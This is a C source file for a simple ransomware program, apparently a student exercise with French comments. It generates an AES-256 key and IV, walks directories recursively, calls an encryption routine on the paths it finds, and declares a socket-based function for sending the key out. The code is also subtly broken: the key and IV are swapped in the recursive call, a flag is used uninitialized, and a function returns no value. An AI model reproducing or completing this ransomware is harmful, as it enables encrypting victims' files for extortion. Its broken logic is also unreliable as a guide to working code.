#include "ransomlib.h"
#include <dirent.h>
// for socket
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>



void usage();

int is_encrypted(char *filename);

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
{
    DIR *d = opendir(name);
    if (d == NULL)
    {
        perror("Erreur : ");
    }
    struct dirent *directory;
    while ((directory = readdir(d)) != NULL)
    {
		if (directory -> d_type != DT_DIR)
        {
			printf(" %s is not a directory\n",directory ->d_name); 
        }
        
        if (directory -> d_type == DT_DIR && strcmp(directory ->d_name,".") != 0 && strcmp(directory ->d_name,"..") != 0)
        {
			char new_path[1000];
            sprintf(new_path, "%s/%s", name, directory ->d_name); /*comme un strcat car on utilise un buffer temporaire new_path pour créer le nouveau path*/
            printf("\n%s\n", new_path);
            printf("%s is a directory\n",directory ->d_name);
            listdir(new_path,key,iv,de_flag);
			encrypt(key,iv,new_path);
        }
    }
    closedir(d);
}

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv)
{
    RAND_bytes(key, sizeKey); 
    RAND_bytes(iv, sizeIv);
    bytes_to_hexa(key, pKey, sizeKey);
	bytes_to_hexa(iv, pIv, sizeIv);
}

int send_key(char *pKey, char *pIv);

int main (int argc, char * argv[])
{
	/*printf("Bon travail!\n");*/
	unsigned char key[AES_256_KEY_SIZE];
	int sizeKey = AES_256_KEY_SIZE;
	unsigned char iv[AES_BLOCK_SIZE];
	int sizeIv = AES_BLOCK_SIZE;
	char de_flag;
	char *pKey = (char*)malloc(2 * sizeof(key) + 1); /*tu fais en fonction de la taille de la clé*/
	char *pIv = (char*)malloc(2 * sizeof (key) + 1);
	generate_key(key,sizeKey,iv,sizeIv,pKey,pIv);
	/*printf("Voici pKey : %s\n",pKey);
	printf("Voici pIV : %s\n",pIv);*/ /*si vous voulez voir la clé et l'iv, retirez le "/*" des deux côtées*/
	listdir(argv[1],key,iv,de_flag);
}


